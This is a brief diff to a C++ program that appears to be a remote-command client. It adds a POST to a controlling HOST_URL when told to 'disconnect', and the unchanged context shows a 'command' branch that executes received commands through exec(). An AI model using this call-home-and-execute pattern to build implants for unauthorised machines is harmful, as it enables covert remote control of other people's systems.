@@ -265,7 +265,8 @@ int main() {
 
         } else 
         if( MacroCmd == "disconnect" ) {
-            
+            post(HOST_URL + "disconnect", "id=" + id);
+            break;
         } else 
         if( MacroCmd == "command") {
             string output = exec(command);
